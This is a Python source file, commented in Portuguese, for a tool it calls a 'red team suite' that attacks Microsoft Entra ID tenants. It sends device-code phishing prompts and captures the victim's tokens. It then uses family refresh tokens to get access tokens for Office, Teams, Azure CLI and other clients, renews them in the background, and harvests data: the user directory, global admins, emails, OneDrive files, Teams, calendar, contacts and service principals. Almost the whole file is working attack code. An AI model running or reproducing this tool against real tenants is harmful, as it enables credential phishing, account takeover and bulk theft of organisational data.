#!/usr/bin/env python3
"""
╔═════════════════════════════════════════════════════════════════════════╗
║          🔐 FRT RED TEAM SUITE v1.2 — SISTEMA PRINCIPAL               ║
║   Family Refresh Token Attack Chain — Microsoft Entra ID / Azure AD   ║
║   Autor: math69b | Tenant: yourdomain.com | Python 3.9+          ║
║   Melhorias v1.2: TokenVault, Paginação, Background Renewer,          ║
║   DM Teams, SharePoint, Calendário, Service Principals,               ║
║   Log por Sessão, HTML Rico, --silent/--json-output                   ║
╚═════════════════════════════════════════════════════════════════════════╝
"""
import json, sys, time, base64, os, re, threading
from pathlib import Path
from datetime import datetime, timedelta, timezone
from typing import Optional, Dict, List, Any

def _now() -> datetime:
    return datetime.now(timezone.utc).replace(tzinfo=None)

try:
    import requests
except ImportError:
    print("[-] pip install requests"); sys.exit(1)


# ═══ MODO GLOBAL — melhoria #10 ════════════════════════════════════════════
class RunMode:
    silent      = False
    json_output = False
    _buf: List[Dict] = []

    @classmethod
    def emit(cls, record: Dict):
        if cls.json_output:
            cls._buf.append(record)

    @classmethod
    def flush_json(cls):
        if cls.json_output:
            print(json.dumps(cls._buf, indent=2, ensure_ascii=False))


# ═══ CONFIGURAÇÃO ══════════════════════════════════════════════════════════
class Config:
    BASE_DIR    = Path.home() / ".frt_suite"
    DATA_DIR    = BASE_DIR / "data"
    LOGS_DIR    = BASE_DIR / "logs"
    BACKUP_DIR  = BASE_DIR / "backups"
    REPORTS_DIR = BASE_DIR / "reports"
    TOKENS_FILE = DATA_DIR / "tokens.json"
    VAULT_FILE  = DATA_DIR / "token_vault.json"
    LOG_FILE    = LOGS_DIR / "frt_suite.log"
    REPORT_FILE = DATA_DIR / "report.json"
    TENANT_ID   = "YOUR_TENANT_ID"
    TENANT_DOM  = "yourdomain.com"
    FOCI_CLIENTS = {
        "1": ("Microsoft Office",        "d3590ed6-52b3-4102-aeff-aad2292ab01c"),
        "2": ("Microsoft Teams",         "1fec8e78-bce4-4aaf-ab1b-5451cc387264"),
        "3": ("Azure CLI",               "04b07795-8ddb-461a-bbee-02f9e1bf7b46"),
        "4": ("OneDrive Sync Client",    "ab9b8c07-8f02-4f72-87fa-80105867a763"),
        "5": ("Outlook Mobile",          "27922004-5251-4030-b22d-91ecd9a37ea4"),
        "6": ("Microsoft Authenticator", "4813382a-8fa7-425e-ab75-3b753aab3abb"),
        "7": ("Microsoft Power BI",      "ea0616a9-dc66-4bd8-b5d7-21e53f4ca7d7"),
        "8": ("Microsoft Intune",        "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223"),
    }
    DEFAULT_SCOPE = "offline_access openid profile https://graph.microsoft.com/.default"
    GRAPH_BASE    = "https://graph.microsoft.com/v1.0"
    REQUESTS_PER_MIN = 30


# ═══ LOGGER — melhoria #8 (log por sessão) ═════════════════════════════════
class Logger:
    COLORS = {"INFO":"[0m","OK":"[92m","WARN":"[93m","ERROR":"[91m","RESET":"[0m"}
    _session_file: Optional[Path] = None

    @classmethod
    def init_session(cls):
        Config.LOGS_DIR.mkdir(parents=True, exist_ok=True)
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        cls._session_file = Config.LOGS_DIR / f"session_{ts}.log"
        cls._write_file(cls._session_file, f"[SESSION START] {ts}\n")

    @classmethod
    def _write_file(cls, path: Path, line: str):
        try:
            with open(path, "a", encoding="utf-8") as f:
                f.write(line)
        except Exception:
            pass

    @classmethod
    def _write(cls, level: str, msg: str):
        ts   = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        line = f"[{ts}] [{level}] {msg}"
        if not RunMode.silent:
            print(f"{cls.COLORS.get(level,'')}{line}{cls.COLORS['RESET']}")
        cls._write_file(Config.LOG_FILE, line + "\n")
        if cls._session_file:
            cls._write_file(cls._session_file, line + "\n")
        RunMode.emit({"ts": ts, "level": level, "msg": msg})

    @classmethod
    def info(cls, m):  cls._write("INFO",  m)
    @classmethod
    def ok(cls, m):    cls._write("OK",    f"✓ {m}")
    @classmethod
    def warn(cls, m):  cls._write("WARN",  f"⚠ {m}")
    @classmethod
    def error(cls, m): cls._write("ERROR", f"✗ {m}")

log = Logger()


# ═══ UTILS — melhoria #2 (paginação) ════════════════════════════════════════
def decode_jwt_claims(token: str) -> Dict:
    parts = token.split(".")
    if len(parts) < 2:
        return {}
    try:
        padded = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.b64decode(padded))
    except Exception:
        return {}

def _graph_req(method: str, url: str, at: str, **kw) -> Optional[requests.Response]:
    """Requisição com retry automático para 429 (backoff exponencial + Retry-After)"""
    hdrs = {"Authorization": f"Bearer {at}", "Content-Type": "application/json", "Accept": "application/json"}
    hdrs.update(kw.pop("headers", {}))
    max_retries = 5
    wait = 2
    for attempt in range(max_retries):
        try:
            r = requests.request(method, url, headers=hdrs, timeout=30, **kw)
            if r.status_code == 429:
                retry_after = int(r.headers.get("Retry-After", wait))
                sleep_for   = min(retry_after, 120)
                log.warn(f"429 Rate Limit — aguardando {sleep_for}s (tentativa {attempt+1}/{max_retries})")
                time.sleep(sleep_for)
                wait = min(wait * 2, 60)
                continue
            if r.status_code == 401: log.error(f"401 Unauthorized: {url}"); return None
            if r.status_code == 403: log.warn(f"403 Forbidden: {url}");     return None
            r.raise_for_status()
            return r
        except requests.RequestException as e:
            if attempt < max_retries - 1:
                log.warn(f"Erro de rede (tentativa {attempt+1}): {e} — retry em {wait}s")
                time.sleep(wait); wait = min(wait * 2, 60)
            else:
                log.error(f"[{method}] {url}: {e}")
    return None

def graph_get(endpoint: str, at: str, params: Dict = None) -> Optional[Dict]:
    url = endpoint if endpoint.startswith("http") else f"{Config.GRAPH_BASE}{endpoint}"
    r = _graph_req("GET", url, at, params=params or {})
    return r.json() if r else None

def graph_get_all(endpoint: str, at: str, params: Dict = None, page_delay: float = 1.0) -> List[Dict]:
    """
    Paginação completa seguindo @odata.nextLink — melhoria #2.
    page_delay: segundos entre cada página (padrão 1s para evitar 429).
    """
    url = f"{Config.GRAPH_BASE}{endpoint}"; items = []; params = params or {}
    page = 0
    while url:
        if page > 0:
            time.sleep(page_delay)   # respiro entre páginas
        r = _graph_req("GET", url, at, params=params)
        if not r: break
        data   = r.json()
        batch  = data.get("value", [])
        items += batch
        url    = data.get("@odata.nextLink")
        params = {}
        page  += 1
        if url:
            sys.stdout.write(f"\r  Paginando... {len(items)} itens")
            sys.stdout.flush()
    if page > 1:
        print()   # nova linha após paginação
    return items

def graph_post(endpoint: str, at: str, payload: Dict) -> Optional[requests.Response]:
    return _graph_req("POST", f"{Config.GRAPH_BASE}{endpoint}", at, json=payload)

def ensure_dirs():
    for d in [Config.DATA_DIR, Config.LOGS_DIR, Config.BACKUP_DIR, Config.REPORTS_DIR]:
        d.mkdir(parents=True, exist_ok=True)

def save_json(fp: Path, data: Any):
    fp.parent.mkdir(parents=True, exist_ok=True)
    with open(fp, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

def load_json(fp: Path) -> Optional[Any]:
    if not fp.exists(): return None
    try:
        with open(fp, encoding="utf-8") as f: return json.load(f)
    except Exception as e:
        log.error(f"Erro ao ler {fp}: {e}"); return None


# ═══ TOKEN VAULT — melhoria #1 ═══════════════════════════════════════════════
class TokenVault:
    """AT por FOCI client — o poder real do FRT"""
    def __init__(self):
        self._v: Dict[str, Dict] = {}
        data = load_json(Config.VAULT_FILE)
        if isinstance(data, dict): self._v = data

    def _save(self): save_json(Config.VAULT_FILE, self._v)

    def store(self, client_id: str, name: str, res: Dict):
        exp = _now() + timedelta(seconds=int(res.get("expires_in", 3600)))
        self._v[client_id] = {
            "client_name": name, "access_token": res["access_token"],
            "refresh_token": res.get("refresh_token", ""),
            "expires_at": exp.isoformat() + "Z", "stored_at": _now().isoformat() + "Z",
        }
        self._save(); log.ok(f"Vault: AT armazenado [{name}]")

    def get_at(self, client_id: str) -> Optional[str]:
        e = self._v.get(client_id)
        if not e: return None
        try:
            if _now() > datetime.fromisoformat(e["expires_at"].replace("Z", "")):
                log.warn(f"Vault: expirado [{e.get('client_name')}]"); return None
        except Exception: pass
        return e.get("access_token")

    def get_best_at(self, prefer: str = None) -> Optional[str]:
        if prefer:
            at = self.get_at(prefer)
            if at: return at
        for cid in self._v:
            at = self.get_at(cid)
            if at: return at
        return None

    def list_vault(self):
        print("\n  [VAULT] Tokens por client:\n")
        if not self._v: log.warn("Vault vazio. Execute Opção 20."); return
        for cid, e in self._v.items():
            try:
                exp   = datetime.fromisoformat(e["expires_at"].replace("Z", ""))
                valid = "✅" if _now() < exp else "❌ expirado"
                mins  = max(0, int((exp - _now()).total_seconds() // 60))
                timer = f"{mins}min" if _now() < exp else ""
            except Exception: valid, timer = "?", ""
            print(f"  {valid}  {e.get('client_name','?'):<35} {timer}")
            print(f"         {cid}")
        print()


# ═══ TOKEN MANAGER ═══════════════════════════════════════════════════════════
class TokenManager:
    def __init__(self):
        ensure_dirs()
        self._tokens: Dict[str, Dict] = {}
        self._active_label: Optional[str] = None
        self.vault = TokenVault()
        self._auto_load()

    def _auto_load(self):
        for p in [Config.TOKENS_FILE, Path.home()/"captura_tokens.json", Path.home()/"tokens.json"]:
            if p.exists() and self.load_from_file(p, silent=True):
                log.ok(f"Tokens carregados de: {p}"); return

    def load_tokens(self, filepath: str = None):
        print("\n[1] CARREGAR TOKENS\n")
        default = str(Path.home() / "captura_tokens.json")
        entered = input(f"  Caminho [{default}]: ").strip() if not filepath else filepath
        path = Path(entered) if entered else Path(default)
        if not path.exists(): log.error(f"Não encontrado: {path}"); return False
        return self.load_from_file(path)

    def load_from_file(self, path: Path, silent=False) -> bool:
        try:
            with open(path, encoding="utf-8") as f: raw = json.load(f)
        except Exception as e:
            if not silent: log.error(f"Erro: {e}"); return False
        if "access_token" in raw:
            label = raw.get("user_email", "primary") or "primary"
            self._tokens[label] = raw
            if not self._active_label: self._active_label = label
        elif isinstance(raw, dict) and all(isinstance(v, dict) for v in raw.values()):
            self._tokens.update(raw)
            if not self._active_label and self._tokens:
                self._active_label = next(iter(self._tokens))
        else:
            if not silent: log.error("Formato não reconhecido."); return False
        save_json(Config.TOKENS_FILE, self._tokens)
        if not silent: log.ok(f"{len(self._tokens)} token(s) carregado(s)")
        return True

    def list_tokens(self):
        print("\n[2] TOKENS CARREGADOS\n")
        if not self._tokens: log.warn("Nenhum token."); return
        for i, (label, tok) in enumerate(self._tokens.items(), 1):
            at = tok.get("access_token",""); rt = tok.get("refresh_token","")
            active = "← ATIVO" if label == self._active_label else ""
            print(f"  [{i}] {label} {active}")
            print(f"       Email  : {tok.get('user_email','N/A')}")
            print(f"       Client : {tok.get('client_name', tok.get('client_id','N/A'))}")
            print(f"       AT     : {'✓ '+at[:30]+'...' if at else '✗ Ausente'}")
            print(f"       RT     : {'✓ Presente (90 dias)' if rt else '✗ Ausente'}")
            print(f"       Expira : {tok.get('expires_at', tok.get('expires_in','?'))}")
            print(f"       Método : {tok.get('capture_method','manual')}\n")
        self.vault.list_vault()

    def renew_token(self, label: str = None):
        print("\n[3] RENOVAR ACCESS TOKEN\n")
        label = label or self._active_label
        if not label or label not in self._tokens: log.error("Sem token ativo."); return False
        tok = self._tokens[label]; rt = tok.get("refresh_token")
        if not rt: log.error("Refresh token ausente."); return False
        client_id = tok.get("client_id","d3590ed6-52b3-4102-aeff-aad2292ab01c")
        tenant    = tok.get("tenant_id", Config.TENANT_ID)
        log.info(f"Renovando: {label}")
        try:
            r = requests.post(
                f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
                data={"grant_type":"refresh_token","refresh_token":rt,
                      "client_id":client_id,"scope":Config.DEFAULT_SCOPE}, timeout=15)
            result = r.json()
        except requests.RequestException as e: log.error(f"Rede: {e}"); return False
        if "access_token" in result:
            self._tokens[label]["access_token"] = result["access_token"]
            self._tokens[label]["refresh_token"] = result.get("refresh_token", rt)
            exp = _now() + timedelta(seconds=int(result.get("expires_in",3600)))
            self._tokens[label]["expires_at"] = exp.isoformat() + "Z"
            save_json(Config.TOKENS_FILE, self._tokens)
            log.ok("Token renovado!")
            return True
        log.error(f"Falha: {result.get('error_description', result)}"); return False

    def validate_tokens(self):
        print("\n[4] VALIDAR TOKENS\n")
        for label, tok in self._tokens.items():
            at = tok.get("access_token")
            if not at: print(f"  {label}: ✗ ausente"); continue
            r = graph_get("/me", at)
            print(f"  {label}: {'✓ '+r.get('userPrincipalName','?') if r else '✗ inválido'}")

    def backup_tokens(self):
        if not self._tokens: log.warn("Nenhum token."); return
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        dest = Config.BACKUP_DIR / f"tokens_backup_{ts}.json"
        save_json(dest, self._tokens); log.ok(f"Backup: {dest}")

    def get_active_token(self) -> Optional[str]:
        if self._active_label and self._active_label in self._tokens:
            return self._tokens[self._active_label].get("access_token")
        return None

    def get_active_data(self) -> Optional[Dict]:
        return self._tokens.get(self._active_label) if self._active_label else None

    def add_token_entry(self, label: str, data: Dict):
        self._tokens[label] = data
        if not self._active_label: self._active_label = label
        save_json(Config.TOKENS_FILE, self._tokens)

    @property
    def has_tokens(self) -> bool: return bool(self._tokens)


# ═══ BACKGROUND RENEWER — melhoria #3 ════════════════════════════════════════
class BackgroundRenewer:
    """Thread daemon que renova 10min antes de expirar"""
    def __init__(self, tm: TokenManager):
        self.tm    = tm
        self._stop = threading.Event()
        self._t    = threading.Thread(target=self._loop, daemon=True, name="FRT-Renewer")

    def start(self):
        if not self._t.is_alive():
            self._t.start(); log.ok("Background renewer ativo (daemon thread)")

    def stop(self): self._stop.set()

    def _loop(self):
        while not self._stop.is_set():
            try: self._check()
            except Exception as e: log.warn(f"[Renewer] {e}")
            self._stop.wait(300)

    def _check(self):
        data = self.tm.get_active_data()
        if not data: return
        exp_s = data.get("expires_at","")
        if not exp_s: return
        try:
            remaining = (datetime.fromisoformat(exp_s.replace("Z","")) - _now()).total_seconds()
            if remaining <= 600:
                log.warn(f"[Renewer] {int(remaining//60)}min — renovando...")
                if self.tm.renew_token(): log.ok("[Renewer] Renovado automaticamente")
        except Exception: pass


# ═══ FASE 1 — CAPTURA ════════════════════════════════════════════════════════
class PhishingModule:
    def __init__(self, tm: TokenManager): self.tm = tm

    def device_code_flow_real(self):
        print("\n" + "━"*65)
        print("  [10] DEVICE CODE FLOW — CAPTURA REAL")
        print("━"*65)
        print("\n  Selecione o Client ID:\n")
        for k, (n, c) in Config.FOCI_CLIENTS.items():
            print(f"  [{k}] {n}\n       {c}")
        choice = input("\n  Opção [1-8, Enter=1]: ").strip() or "1"
        client_name, client_id = Config.FOCI_CLIENTS.get(choice, Config.FOCI_CLIENTS["1"])
        log.info(f"Device Code Flow REAL | {client_name}")
        try:
            r = requests.post(
                f"https://login.microsoftonline.com/{Config.TENANT_ID}/oauth2/v2.0/devicecode",
                data={"client_id": client_id, "scope": Config.DEFAULT_SCOPE}, timeout=15)
            r.raise_for_status(); dd = r.json()
        except requests.RequestException as e:
            log.error(f"Erro: {e}"); return None
        if "error" in dd: log.error(str(dd.get("error_description", dd))); return None

        uc = dd["user_code"]; dc = dd["device_code"]
        interval = int(dd.get("interval", 5)); expires_in = int(dd.get("expires_in", 900))
        print(f"\n{'='*65}\n  🔑  AUTENTICAÇÃO VIA BROWSER\n{'='*65}")
        print(f"  1. Abra : {dd.get('verification_uri','https://microsoft.com/devicelogin')}")
        print(f"  2. Código: \033[1;33m{uc}\033[0m")
        print(f"  3. Login @{Config.TENANT_DOM}  ⏳ {expires_in//60}min\n{'='*65}")

        deadline = time.time() + expires_in
        try:
            while time.time() < deadline:
                time.sleep(interval)
                try:
                    r = requests.post(
                        f"https://login.microsoftonline.com/{Config.TENANT_ID}/oauth2/v2.0/token",
                        data={"grant_type":"urn:ietf:params:oauth:grant-type:device_code",
                              "device_code":dc,"client_id":client_id}, timeout=15)
                    result = r.json()
                except requests.RequestException as e:
                    log.warn(f"Polling: {e}"); continue
                if "access_token" in result:
                    return self._success(result, client_id, client_name)
                err = result.get("error","")
                if err == "authorization_pending": sys.stdout.write("."); sys.stdout.flush()
                elif err == "slow_down": interval = min(interval + 5, 30)
                elif err in ("expired_token","access_denied"):
                    log.error(f"Encerrado: {err}"); return None
                else: log.error(f"Erro: {result}"); return None
        except KeyboardInterrupt:
            print(); log.warn("Polling interrompido pelo usuário."); return None
        log.error("Tempo esgotado."); return None

    def _success(self, result: Dict, client_id: str, client_name: str) -> Dict:
        print(); log.ok("Token capturado!")
        claims    = decode_jwt_claims(result.get("access_token",""))
        email     = claims.get("upn") or claims.get("preferred_username") or "unknown"
        user_id   = claims.get("oid","unknown"); tid = claims.get("tid", Config.TENANT_ID)
        now       = _now(); exp = now + timedelta(seconds=int(result.get("expires_in",3600)))
        entry = {
            "access_token": result.get("access_token"), "refresh_token": result.get("refresh_token"),
            "id_token": result.get("id_token"), "scope": result.get("scope",""),
            "expires_in": result.get("expires_in",3600), "expires_at": exp.isoformat()+"Z",
            "tenant_id": tid, "tenant_domain": Config.TENANT_DOM,
            "user_id": user_id, "user_email": email, "client_id": client_id,
            "client_name": client_name, "captured_at": now.isoformat()+"Z",
            "capture_method": "device_code_flow_real", "frt_family": "FOCI", "frt_extracted": False,
        }
        label = f"{email}::{client_id}"
        self.tm.add_token_entry(label, entry)
        self.tm.vault.store(client_id, client_name, result)   # popula vault
        at = result.get("access_token",""); rt = result.get("refresh_token","")
        print(f"\n  {'='*60}\n  ✅  SALVO: {Config.TOKENS_FILE}\n  {'='*60}")
        print(f"  Usuário: {email}  |  OID: {user_id}  |  Tenant: {tid}")
        print(f"  AT: {at[:40]}... ({len(at)} chars)")
        print(f"  RT: {'✅ Presente — FRT disponível' if rt else '❌ Ausente'}")
        print(f"\n  → Op.20 para expandir via FRT\n  {'='*60}\n")
        return entry

    def gerar_phishing_url(self):
        print("\n[11] GERAR URL DE PHISHING\n")
        tenant = input(f"  Tenant [{Config.TENANT_ID}]: ").strip() or Config.TENANT_ID
        cid    = input("  Client ID [Enter=Office]: ").strip() or "d3590ed6-52b3-4102-aeff-aad2292ab01c"
        client_name = next((n for n, c in Config.FOCI_CLIENTS.values() if c == cid), "Custom")
        try:
            r = requests.post(f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode",
                              data={"client_id":cid,"scope":Config.DEFAULT_SCOPE}, timeout=10)
            d = r.json()
        except Exception as e: log.error(str(e)); return
        if "user_code" not in d: log.error(str(d)); return

        uc         = d["user_code"]; dc = d["device_code"]
        expires_in = int(d.get("expires_in", 900))
        interval   = int(d.get("interval", 5))
        vuri       = d.get("verification_uri", "https://microsoft.com/devicelogin")

        print(f"\n  URL   : {vuri}")
        print(f"  Código: \033[1;33m{uc}\033[0m  (expira {expires_in//60}min)\n")

        aguardar = input("  Aguardar token agora? (S/n): ").strip().lower()
        if aguardar == "n":
            return

        log.info("Polling iniciado — aguardando autenticação...")
        deadline = time.time() + expires_in
        try:
            while time.time() < deadline:
                time.sleep(interval)
                try:
                    r = requests.post(
                        f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
                        data={"grant_type":"urn:ietf:params:oauth:grant-type:device_code",
                              "device_code":dc,"client_id":cid}, timeout=15)
                    result = r.json()
                except requests.RequestException as e:
                    log.warn(f"Polling: {e}"); continue
                if "access_token" in result:
                    return self._success(result, cid, client_name)
                err = result.get("error","")
                if err == "authorization_pending": sys.stdout.write("."); sys.stdout.flush()
                elif err == "slow_down": interval = min(interval + 5, 30)
                elif err in ("expired_token","access_denied"):
                    log.error(f"Encerrado: {err}"); return None
                else: log.error(f"Erro: {result}"); return None
        except KeyboardInterrupt:
            print(); log.warn("Polling interrompido pelo usuário."); return None
        log.error("Tempo esgotado."); return None


# ═══ FASE 2 — ANÁLISE FRT + VAULT ════════════════════════════════════════════
class FRTAnalyzer:
    def __init__(self, tm: TokenManager): self.tm = tm

    def analisar_frt(self):
        print("\n[20] ANÁLISE FRT — EXPANSÃO FOCI + TOKEN VAULT\n")
        data = self.tm.get_active_data(); rt = (data or {}).get("refresh_token")
        if not rt: log.error("RT ausente. Capture via Op.10."); return
        tenant = (data or {}).get("tenant_id", Config.TENANT_ID); results = {}
        log.info(f"Testando {len(Config.FOCI_CLIENTS)} FOCI clients..."); print()
        for key, (name, cid) in Config.FOCI_CLIENTS.items():
            sys.stdout.write(f"  [{key}] {name:<35} "); sys.stdout.flush()
            try:
                r = requests.post(
                    f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token",
                    data={"grant_type":"refresh_token","refresh_token":rt,
                          "client_id":cid,"scope":Config.DEFAULT_SCOPE}, timeout=15)
                res = r.json()
            except Exception as e: print(f"ERRO ({e})"); results[name]={"status":"error","client_id":cid}; continue
            if "access_token" in res:
                print("✅ DISPONÍVEL")
                results[name] = {"status":"available","client_id":cid,"has_rt":"refresh_token" in res}
                self.tm.vault.store(cid, name, res)   # ← vault populado automaticamente
            elif "error" in res:
                err = res.get("error",""); desc = res.get("error_description","")[:60]
                if "interaction_required" in err or "AADSTS65001" in desc:
                    print("⚠  Requer interação"); results[name]={"status":"interaction_required","client_id":cid}
                else:
                    print(f"✗  Bloqueado ({err})"); results[name]={"status":"blocked","client_id":cid,"error":err}
            else:
                print("✗  Inesperado"); results[name]={"status":"unknown","client_id":cid}
            time.sleep(1)
        save_json(Config.DATA_DIR/"frt_analysis.json", results)
        avail = [k for k,v in results.items() if v["status"]=="available"]
        print(f"\n  [+] {len(avail)}/{len(results)} clients disponíveis")
        print(f"  [+] Token Vault populado com {len(avail)} AT(s)")
        if avail: print(f"  [+] Disponíveis: {', '.join(avail)}")
        RunMode.emit({"action":"frt_analysis","available":avail}); return results

    def ver_analise_anterior(self):
        print("\n[21] ANÁLISE FRT ANTERIOR\n")
        data = load_json(Config.DATA_DIR/"frt_analysis.json")
        if not data: log.warn("Execute Opção 20."); return
        for name, info in data.items():
            s = info.get("status","?")
            print(f"  {'✅' if s=='available' else '⚠' if 'interaction' in s else '✗'} {name:<35} [{s}]")
        print(); self.tm.vault.list_vault()


# ═══ FASE 3 — EXPLORAÇÃO (paginação completa) ════════════════════════════════
class ExploitationModule:
    def __init__(self, tm: TokenManager): self.tm = tm

    def _at(self) -> Optional[str]:
        at = self.tm.get_active_token() or self.tm.vault.get_best_at()
        if not at: log.error("Sem token. Use Op.1 ou Op.10.")
        return at

    def enumerar_usuarios(self):
        print("\n[30] ENUMERAR USUÁRIOS (paginação completa)\n")
        at = self._at()
        if not at: return
        users = graph_get_all("/users", at, params={
            "$select": "displayName,userPrincipalName,id,jobTitle,department"})
        log.ok(f"{len(users)} usuários encontrados")
        for u in users[:10]:
            print(f"  {u.get('displayName',''):<30} {u.get('userPrincipalName','')}")
        if len(users) > 10: print(f"  ... (+{len(users)-10} mais)")
        save_json(Config.DATA_DIR/"users_enum.json", users)
        log.ok(f"Salvo: {Config.DATA_DIR/'users_enum.json'}")
        RunMode.emit({"action":"enum_users","count":len(users)}); return users

    def encontrar_admins(self):
        print("\n[31] ENCONTRAR GLOBAL ADMINS\n")
        at = self._at()
        if not at: return
        roles = {
            "62e90394-69f5-4237-9190-012177145e10": "Global Administrator",
            "e8611ab8-c189-46e8-94e1-60213ab1f814": "Privileged Role Administrator",
            "194ae4cb-b126-40b2-bd5b-6091b380977d": "Security Administrator",
            "f28a1f50-f6e7-4571-818b-6a12f2af6b6c": "SharePoint Administrator",
            "9b895d92-2cd3-44c7-9d02-a6ac2d5ea5c3": "Application Administrator",
        }
        found = {}
        for rid, rname in roles.items():
            r = graph_get(f"/directoryRoles/roleTemplateId={rid}/members", at)
            if r:
                members = r.get("value",[])
                if members:
                    found[rname] = [{"displayName":m.get("displayName"),"upn":m.get("userPrincipalName"),"id":m.get("id")} for m in members]
                    log.ok(f"{rname}: {len(members)}")
                    for m in members: print(f"  ⚠  {m.get('displayName',''):<30} {m.get('userPrincipalName','')}")
            time.sleep(0.5)
        if found: save_json(Config.DATA_DIR/"admins_enum.json", found); log.ok("Admins salvos")
        else: log.warn("Nenhum admin (ou sem permissão).")
        RunMode.emit({"action":"enum_admins","data":found}); return found

    def ler_emails(self, limit: int = 20):
        print(f"\n[32] LER EMAILS (últimos {limit})\n")
        at = self._at()
        if not at: return
        r = graph_get("/me/messages", at, params={
            "$select":"subject,from,receivedDateTime,bodyPreview,importance,isRead",
            "$top":limit,"$orderby":"receivedDateTime DESC"})
        if not r: return
        emails = r.get("value",[])
        log.ok(f"{len(emails)} emails lidos")
        for msg in emails:
            sender = msg.get("from",{}).get("emailAddress",{})
            unread = "[NÃO LIDO] " if not msg.get("isRead") else ""
            print(f"  {unread}{msg.get('subject','')[:50]}")
            print(f"  De: {sender.get('name','?')} <{sender.get('address','?')}> | {msg.get('receivedDateTime','')[:19]}\n")
        save_json(Config.DATA_DIR/"emails_read.json", emails)
        log.ok(f"Salvo: {Config.DATA_DIR/'emails_read.json'}"); return emails

    def listar_onedrive(self):
        print("\n[33] LISTAR ONEDRIVE\n")
        at = self._at()
        if not at: return
        items = graph_get_all("/me/drive/root/children", at, params={
            "$select":"name,size,lastModifiedDateTime,folder,file"})
        log.ok(f"{len(items)} itens")
        for item in items:
            tipo = "📁" if "folder" in item else "📄"
            size = f"{item.get('size',0)//1024} KB" if item.get("size") else ""
            print(f"  {tipo} {item.get('name',''):<40} {size}")
        save_json(Config.DATA_DIR/"onedrive_files.json", items)
        log.ok(f"Salvo: {Config.DATA_DIR/'onedrive_files.json'}"); return items

    def enumerar_teams(self):
        print("\n[34] ENUMERAR TEAMS\n")
        at = self._at()
        if not at: return
        r = graph_get("/me/joinedTeams", at)
        if not r: return
        teams = r.get("value",[])
        log.ok(f"{len(teams)} teams")
        for t in teams: print(f"  📋 {t.get('displayName',''):<40} {t.get('id','')[:20]}...")
        save_json(Config.DATA_DIR/"teams_enum.json", teams)
        log.ok(f"Salvo: {Config.DATA_DIR/'teams_enum.json'}"); return teams

    def coleta_rapida(self):
        print("\n[35] COLETA RÁPIDA\n")
        log.info("Coleta completa iniciada...")
        self.enumerar_usuarios(); print()
        self.encontrar_admins(); print()
        self.ler_emails(); print()
        self.listar_onedrive(); print()
        self.enumerar_teams()
        log.ok("Coleta concluída! → Op.50 para relatório")


# ═══ INTEL — melhoria #6 (calendário + contatos) ═════════════════════════════
class IntelModule:
    def __init__(self, tm: TokenManager): self.tm = tm

    def _at(self) -> Optional[str]:
        at = self.tm.get_active_token() or self.tm.vault.get_best_at()
        if not at: log.error("Sem token ativo.")
        return at

    def calendario(self):
        print("\n[36] CALENDÁRIO — PRÓXIMOS 30 DIAS\n")
        at = self._at()
        if not at: return
        start = _now().strftime("%Y-%m-%dT00:00:00Z")
        end   = (_now()+timedelta(days=30)).strftime("%Y-%m-%dT00:00:00Z")
        r = graph_get("/me/calendarView", at, params={
            "startDateTime":start,"endDateTime":end,
            "$select":"subject,start,end,location,attendees,organizer,isOnlineMeeting",
            "$top":50,"$orderby":"start/dateTime"})
        if not r: return
        events = r.get("value",[])
        log.ok(f"{len(events)} eventos nos próximos 30 dias"); print()
        for ev in events:
            st = ev.get("start",{}).get("dateTime","")[:16].replace("T"," ")
            en = ev.get("end",{}).get("dateTime","")[:16].replace("T"," ")
            subj = ev.get("subject","Sem título")[:50]
            loc  = ev.get("location",{}).get("displayName","")[:30]
            online = "🌐" if ev.get("isOnlineMeeting") else "  "
            attendees = len(ev.get("attendees",[]))
            print(f"  {online} {st} → {en}  📅 {subj}")
            if loc: print(f"     📍 {loc}")
            if attendees: print(f"     👥 {attendees} participante(s)")
            print()
        save_json(Config.DATA_DIR/"calendar_events.json", events)
        log.ok(f"Salvo: {Config.DATA_DIR/'calendar_events.json'}")
        RunMode.emit({"action":"calendar","count":len(events)}); return events

    def contatos(self):
        print("\n[37] CONTATOS\n")
        at = self._at()
        if not at: return
        contatos = graph_get_all("/me/contacts", at, params={
            "$select":"displayName,emailAddresses,jobTitle,companyName,department,mobilePhone"})
        log.ok(f"{len(contatos)} contatos")
        for c in contatos[:15]:
            emails = ", ".join(e.get("address","") for e in c.get("emailAddresses",[]))
            print(f"  👤 {c.get('displayName',''):<30} {emails}")
            if c.get("jobTitle"): print(f"     {c.get('jobTitle','')} — {c.get('companyName','')}")
        if len(contatos) > 15: print(f"  ... (+{len(contatos)-15} mais)")
        save_json(Config.DATA_DIR/"contacts.json", contatos)
        log.ok(f"Salvo: {Config.DATA_DIR/'contacts.json'}")
        RunMode.emit({"action":"contacts","count":len(contatos)}); return contatos


# ═══ TENANT RECON — melhoria #7 (service principals / apps) ══════════════════
class TenantReconModule:
    def __init__(self, tm: TokenManager): self.tm = tm

    def _at(self) -> Optional[str]:
        # Prefere Azure CLI — escopos de diretório mais amplos
        at = self.tm.vault.get_at("04b07795-8ddb-461a-bbee-02f9e1bf7b46") or self.tm.get_active_token()
        if not at: log.error("Sem token. Prefira Azure CLI (Op.10→[3]).")
        return at

    def service_principals(self):
        print("\n[38] SERVICE PRINCIPALS\n")
        at = self._at()
        if not at: return
        sps = graph_get_all("/servicePrincipals", at, params={
            "$select":"displayName,appId,servicePrincipalType,publisherName,appRoles",
            "$top":100})
        if not sps: log.warn("Sem resultados (requer Application.Read.All)."); return
        log.ok(f"{len(sps)} service principals")
        apps = [s for s in sps if s.get("servicePrincipalType")=="Application"]
        mid  = [s for s in sps if s.get("servicePrincipalType")=="ManagedIdentity"]
        print(f"  📦 Applications     : {len(apps)}")
        print(f"  🤖 Managed Identities: {len(mid)}")
        print(f"  Outros              : {len(sps)-len(apps)-len(mid)}\n")
        for sp in apps[:20]:
            print(f"  🔹 {sp.get('displayName',''):<40} pub: {sp.get('publisherName','?')}")
            print(f"     {sp.get('appId','')}  roles: {len(sp.get('appRoles',[]))}")
        if len(apps)>20: print(f"  ... (+{len(apps)-20} mais)")
